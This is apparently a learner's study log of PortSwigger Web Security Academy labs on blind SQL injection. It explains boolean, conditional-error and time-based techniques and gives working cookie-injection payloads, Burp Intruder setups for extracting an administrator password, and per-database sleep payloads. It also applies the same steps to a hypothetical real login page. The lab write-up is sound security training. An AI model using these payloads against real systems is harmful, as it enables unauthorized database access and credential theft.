# Day 17 — Blind SQL Injection: Conditional Responses, Conditional Errors, Time Based

**Date:** April 30, 2026  
**Platform:** PortSwigger Web Security Academy  
**Topic:** Blind SQLi — boolean based, error based, time based  
**Labs Completed:** Lab 10 (conditional responses), Lab 11 (conditional errors), Lab 12 (time based)  

---

## Foundation — What is Blind SQLi and Why it is Different

Every lab until Day 16 was **in-band SQLi** — the database output appeared directly on the page. You could see usernames and passwords rendered in the product listing. You asked the database a question and it answered visibly.

**Blind SQLi is when the application is still vulnerable but shows you nothing back.**

No output. No data rendered on the page. No error messages. The database runs your query — but the result never reaches you directly.

You are flying blind. You cannot see what the database returns. So instead of asking the database to **show you data** — you ask it **true or false questions** and read the application's behavior as the answer.

This matters because most real production applications do not display raw database output. They are all effectively blind targets. In-band SQLi is the exception. Blind SQLi is the norm.

---

## Three Types of Blind SQLi

### Type 1 — Boolean Based (Conditional Responses)

You inject a condition into the query. If the condition is TRUE the page behaves one way. If FALSE it behaves another way. You use that behavioral difference to extract data one bit at a time.

The behavioral difference can be anything — a message appearing or disappearing, different content, different response length. You do not need output. You just need **any consistent difference** between true and false.

### Type 2 — Conditional Errors

The page shows zero behavioral difference between true and false. But if you force a database error — the server returns HTTP 500. No error — HTTP 200. You use the error itself as your true/false signal.

You deliberately cause a divide by zero error when your condition is true. The error vs no error tells you the answer.

### Type 3 — Time Based

No output. No errors. No behavioral difference of any kind. Your only signal is **response time**.

You inject a time delay into the query. If your condition is true — the database sleeps for several seconds before responding. If false — it responds immediately. You measure how long the server takes to answer.

---

## Core Concepts Before the Labs

### What is SUBSTRING / SUBSTR

`SUBSTRING(string, start, length)` extracts a portion of a string.

- `string` — the value you are extracting from, usually a column name like `password`
- `start` — which character position to start from. Position 1 is the first character
- `length` — how many characters to extract

Examples:
```sql
SUBSTRING('hello', 1, 1)   -- returns 'h'
SUBSTRING('hello', 2, 1)   -- returns 'e'
SUBSTRING('hello', 3, 1)   -- returns 'l'
```

In Blind SQLi you extract passwords one character at a time by asking:
> Is the character at position 1 equal to 'a'? Equal to 'b'? Equal to 'c'?

You cycle through all possible characters until the application says true. Then move to position 2. Repeat until you have every character.

Oracle uses `SUBSTR()`. PostgreSQL and MySQL use `SUBSTRING()`. They work identically — just different names.

### What is LENGTH

`LENGTH(string)` returns the number of characters in a string.

```sql
LENGTH('hello')      -- returns 5
LENGTH('password')   -- returns 8
```

In Blind SQLi you use it to find how long a password is before you start extracting it character by character. You need to know when to stop.

### What is CASE WHEN

`CASE WHEN` is SQL's if-then-else. It evaluates a condition and returns different values based on whether it is true or false.

```sql
CASE WHEN (condition) THEN value_if_true ELSE value_if_false END
```

Example:
```sql
CASE WHEN (1=1) THEN 'yes' ELSE 'no' END   -- returns 'yes'
CASE WHEN (1=2) THEN 'yes' ELSE 'no' END   -- returns 'no'
```

In error based Blind SQLi you combine CASE WHEN with a deliberate error:
```sql
CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END
```

If condition is true — execute `1/0` which causes divide by zero — database throws error — HTTP 500.  
If condition is false — return empty string — no error — HTTP 200.

### What is TO_CHAR(1/0)

`TO_CHAR()` is an Oracle function that converts a number to a string. `1/0` is division by zero — which Oracle throws an error on.

The reason you wrap `1/0` inside `TO_CHAR()` is that Oracle's CASE WHEN requires consistent data types across THEN and ELSE branches. `TO_CHAR(1/0)` never actually returns a value — it errors before it can — but the type system is satisfied. This is Oracle specific syntax.

---

## Lab 10 — Blind SQLi with Conditional Responses

**Goal:** Extract the administrator password using only a "Welcome back" message as your true/false signal. The injection point is a tracking cookie, not a URL parameter.

**Credentials extracted:** `administrator:54na5widvf41wn9pnc00`

---

### Step 1 — Intercept the Request

Open Burp Suite's built-in browser and load the lab homepage. Go to HTTP history, find the `GET /` request, send it to Repeater.

In Repeater locate the Cookie header:
```
Cookie: TrackingId=xyz123; session=abc
```

All your payloads go at the end of the `TrackingId` value. You work entirely in Repeater.

**Why the cookie and not the URL:** The application uses the TrackingId cookie value in a SQL query to track returning users. The result of that query is never displayed — but the application checks if any rows were returned. If rows returned — it shows "Welcome back". This is your signal.

---

### Step 2 — Confirm Boolean Behavior

```sql
TrackingId=xyz123' AND '1'='1
TrackingId=xyz123' AND '1'='2
```

**What this does:**

`' AND '1'='1` — appends a condition that is always true. The original query plus your condition both succeed. The application finds a matching row. Welcome back appears.

`' AND '1'='2` — appends a condition that is always false. 1 never equals 2. The overall condition fails. No matching row. Welcome back disappears.

**What to look for:** Welcome back present on the first payload. Welcome back absent on the second. If you see this difference — boolean blind SQLi confirmed.

---

### Step 3 — Confirm the Users Table Exists

```sql
TrackingId=xyz123' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**Breaking this down:**

- `(SELECT 'a' FROM users LIMIT 1)` — asks the database: does the users table exist and does it have at least one row? If yes, this subquery returns the string `'a'`
- `='a'` — checks if the returned value equals `'a'`
- If the table exists and has rows — subquery returns `'a'` — `'a'='a'` is TRUE — Welcome back appears
- If the table does not exist — database errors — condition fails — Welcome back disappears

`LIMIT 1` ensures you only get one row back. Without it the subquery could return multiple rows which would cause an error.

---

### Step 4 — Confirm Administrator User Exists

```sql
TrackingId=xyz123' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Breaking this down:**

- Same structure as Step 3 but now filtering by `WHERE username='administrator'`
- Asks: does a row exist in users where username is exactly `administrator`?
- If yes — subquery returns `'a'` — condition TRUE — Welcome back appears
- If no such user — subquery returns nothing — condition fails — Welcome back disappears

Welcome back appeared — administrator user confirmed to exist.

---

### Step 5 — Find the Password Length

```sql
TrackingId=xyz123' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
TrackingId=xyz123' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
TrackingId=xyz123' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```

**Breaking this down:**

- `AND LENGTH(password)>1` — adds a second condition inside the subquery: the password must also be longer than 1 character
- If both conditions are true — subquery returns `'a'` — Welcome back appears — password IS longer than the number you tested
- If the length condition fails — subquery returns nothing — Welcome back disappears — password is NOT longer than that number

You increment the number until Welcome back disappears. If `>19` shows Welcome back and `>20` does not — password is exactly 20 characters long.

**Password length confirmed: 20 characters**

---

### Step 6 — Extract Password Character by Character Using Intruder

Send the request to Burp Intruder.

**The base payload:**
```sql
TrackingId=xyz123' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

**Breaking this down:**

- `SUBSTRING(password,1,1)` — extract 1 character from the password starting at position 1
- `='a'` — ask: is that character equal to `'a'`?
- If yes — Welcome back appears — you found the first character
- If no — Welcome back disappears — try next character

**Intruder setup — Sniper attack:**

1. In Intruder Positions tab, clear all auto-assigned markers
2. Highlight only the character `a` inside `='§a§'` — this is your payload position
3. Attack type: Sniper — one payload set cycling through one position
4. Payload set: lowercase a-z and numbers 0-9
5. Start attack
6. Sort results by Status column — the one request returning HTTP 500 or with different response length is your character

**Then move to position 2:**
```sql
SUBSTRING(password,2,1)
```

Repeat for positions 3 through 20. Write each character down in order. That is your password.

**Why Cluster Bomb for full automation (Burp Pro):**
Cluster Bomb uses two payload sets simultaneously — one for the position number (1 through 20) and one for the character (a-z, 0-9). It tries every combination. You run one attack instead of 20 separate Sniper attacks. Community Edition does not support Cluster Bomb fully — Sniper per position is the workaround.

**Password extracted:** `54na5widvf41wn9pnc00`

---

## Lab 11 — Blind SQLi with Conditional Errors

**Goal:** Same extraction — but no Welcome back message exists. The only signal is HTTP 500 error vs HTTP 200 OK. The database is Oracle.

---

### Step 1 — Intercept and Confirm Oracle

Same as Lab 10 — find TrackingId cookie, send to Repeater.

First confirm the database is Oracle and that errors work as a signal:

```sql
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

**What this does:** Concatenates a valid Oracle subquery into the TrackingId value. `FROM dual` is Oracle-specific. If the page returns HTTP 200 — Oracle confirmed, valid syntax confirmed.

```sql
TrackingId=xyz'||(SELECT '' FROM not_a_real_table)||'
```

**What this does:** References a table that does not exist. Oracle throws an error. Page returns HTTP 500. This confirms that database errors reach the HTTP response — meaning you can use errors as your signal.

**Why `||` concatenation:** On Oracle you cannot just append `AND` conditions the same way as PostgreSQL. The `||` operator concatenates strings. You are building a string that includes your subquery result. If the subquery errors — the whole expression errors.

---

### Step 2 — Confirm Conditional Error Logic Works

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**Breaking this down:**

- `CASE WHEN (1=1)` — condition that is always true
- `THEN TO_CHAR(1/0)` — if true, execute divide by zero. Oracle throws error. HTTP 500
- `ELSE ''` — if false, return empty string. No error. HTTP 200
- `FROM dual` — Oracle requires FROM in every SELECT

Result: HTTP 500 — TRUE condition correctly triggers error.

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Result: HTTP 200 — FALSE condition correctly returns no error.

Your error signal is working. HTTP 500 = TRUE. HTTP 200 = FALSE.

---

### Step 3 — Confirm Administrator Exists

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Breaking this down:**

- Same CASE WHEN structure but now with `FROM users WHERE username='administrator'`
- If the administrator row exists — the SELECT finds a row — CASE WHEN evaluates — condition 1=1 is true — divide by zero — HTTP 500
- If no administrator row — SELECT finds nothing — CASE WHEN never evaluates — no error — HTTP 200

Result: HTTP 500 — administrator user confirmed to exist.

---

### Step 4 — Find Password Length

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Breaking this down:**

- `LENGTH(password)>1` is now the condition inside CASE WHEN
- If password is longer than 1 — condition TRUE — divide by zero — HTTP 500
- If password is not longer than 1 — condition FALSE — no error — HTTP 200

Increment the number: `>1`, `>5`, `>10`, `>15`, `>19`, `>20`

When you get HTTP 200 — the password is NOT longer than that number. Last HTTP 500 before that tells you the exact length.

**Password length confirmed: 20 characters**

---

### Step 5 — Extract Password Character by Character

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Breaking this down:**

- `SUBSTR(password,1,1)` — Oracle's version of SUBSTRING. Extracts 1 character from position 1
- `='a'` — asks: is this character equal to 'a'?
- If yes — condition TRUE — divide by zero — HTTP 500 — you found the character
- If no — condition FALSE — no error — HTTP 200 — try next character

**Intruder setup — Sniper:**

1. Mark `'a'` as payload position: `='§a§'`
2. Attack type: Sniper
3. Payload: a-z and 0-9
4. Sort results by Status — HTTP 500 is your character

Change `SUBSTR(password,1,1)` to `SUBSTR(password,2,1)` for position 2. Repeat through position 20.

---

## Lab 12 — Blind SQLi with Time Delays

**Goal:** No output, no errors, no behavioral difference. Extract data using only response time as the signal.

**How it works:**

You inject a sleep command into the query. If the database executes your payload — it waits before responding. If the payload does not execute — it responds immediately.

**MySQL:**
```sql
' AND SLEEP(5)--
```

**PostgreSQL:**
```sql
'; SELECT pg_sleep(5)--
```

**Oracle:**
```sql
' AND 1=1 AND dbms_pipe.receive_message('a',5)=1--
```

**Confirming injection:**

Send the payload and measure response time in Burp. Normal response might be under 1 second. If your SLEEP payload causes a 5 second delay — injection confirmed.

**Combining with conditions:**

```sql
' AND (SELECT SLEEP(5) FROM users WHERE username='administrator' AND LENGTH(password)>10)--
```

**Breaking this down:**

- If the administrator exists AND password is longer than 10 — SLEEP(5) executes — 5 second delay — condition TRUE
- If either condition fails — SLEEP never executes — immediate response — condition FALSE

You use this to extract password length and then characters exactly like boolean based — but measuring time instead of reading a message.

**Why time based is the last resort:**

It is slow. Every single character check takes at least 5 seconds if true. A 20 character password could take 20 minutes or more to extract manually. It is also unreliable on networks with variable latency — a slow connection can look like a SLEEP when it is not. But when you have absolutely no other signal — it is your only option.

---

## Vulnerable Code — Why Blind SQLi Works

A typical vulnerable backend for a tracking cookie:

```php
$trackingId = $_COOKIE['TrackingId'];
$query = "SELECT 1 FROM tracking_table WHERE id = '" . $trackingId . "'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    echo "Welcome back";
}
```

No sanitization. Your input goes directly into the query. The application never displays the query result — it only checks if any rows were returned.

When you inject `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='s` the database runs:

```sql
SELECT 1 FROM tracking_table WHERE id = '' 
AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='s'
```

If the first character of the password is `s` — the whole condition is TRUE — one row returned — Welcome back displayed. The application has no idea it just confirmed a character of the admin password. It just ran the query and checked row count.

---

## Chain Thinking

**Scenario:** You find a login page. SQLi in the username field. Page never shows errors, never shows database output. But you notice the page says "Invalid credentials" on wrong login and just reloads blank on some of your payloads.

**How to confirm blind SQLi and what to do next:**

**Step 1 — Identify the behavioral difference**
"Invalid credentials" vs blank reload is your signal. This is boolean behavior — two different responses based on your input.

**Step 2 — Confirm with always-true and always-false**
```sql
admin' AND '1'='1    -- should give "Invalid credentials" (valid SQL, no match but query runs)
admin' AND '1'='2    -- should give blank reload (false condition breaks query differently)
```
If responses differ — boolean blind SQLi confirmed.

**Step 3 — Test if you can query other tables**
```sql
admin' AND (SELECT 'a' FROM users LIMIT 1)='a
```
If this gives "Invalid credentials" — you can query the users table.

**Step 4 — Extract data**
Follow the same SUBSTRING character-by-character chain from Lab 10. Use whichever response ("Invalid credentials" vs blank) as your TRUE signal.

**Step 5 — If no behavioral difference at all**
Move to error based — try CASE WHEN with divide by zero. If that also gives nothing — move to time based with SLEEP.

**Combined impact:** Blind SQLi is harder to detect and exploit but the end result is identical to visible SQLi — full credential extraction, admin access, potential RCE if chained with file upload or other vulnerabilities. The only difference is the technique required to extract the data.

---

## Foundation Checklist

**1. What is the difference between in-band SQLi and Blind SQLi?**
In-band SQLi returns database output directly on the page — you can see the data you extracted. Blind SQLi returns nothing — the database runs your query but the result never reaches you. You infer answers from application behavior instead of reading output directly.

**2. What are the three types of Blind SQLi?**
Boolean based — true/false from page behavior. Error based — true/false from HTTP 500 vs HTTP 200. Time based — true/false from response delay vs immediate response.

**3. What does SUBSTRING(password, 1, 1) do?**
Extracts one character from the password string starting at position 1. Position 1 is the first character. Changing the middle number moves to the next character. You extract the entire password by doing this for every position.

**4. Why do you find the password length before extracting characters?**
So you know when to stop. If you do not know the length you might stop too early and miss characters, or keep going past the end and waste time. LENGTH() tells you exactly how many SUBSTRING iterations you need.

**5. What does CASE WHEN do in error based Blind SQLi?**
It is SQL's if-then-else. CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END — if the condition is true it executes divide by zero which causes a database error. If false it returns empty string and no error occurs. HTTP 500 means true. HTTP 200 means false.

**6. Why is time based Blind SQLi the last resort?**
It is slow — every single check takes seconds. It is unreliable — network latency can create false positives. And it puts load on the target server which can get you detected. You only use it when no other signal exists.

---

## Real World Context

Most real production applications are blind targets. Developers know not to display raw database errors or output. But they often forget that behavioral differences — a message appearing, a redirect happening, a response taking longer — can leak just as much information as direct output.

Blind SQLi is what automated scanners like sqlmap detect first when they probe an application. sqlmap's `--technique=B` flag runs boolean based blind, `--technique=T` runs time based. Now you understand exactly what those flags are doing under the hood.

Bug bounty programs see a lot of blind SQLi reports. Because the data is not displayed directly, developers sometimes think it is lower severity. It is not. The extraction technique is slower but the impact is identical — full database access.

---
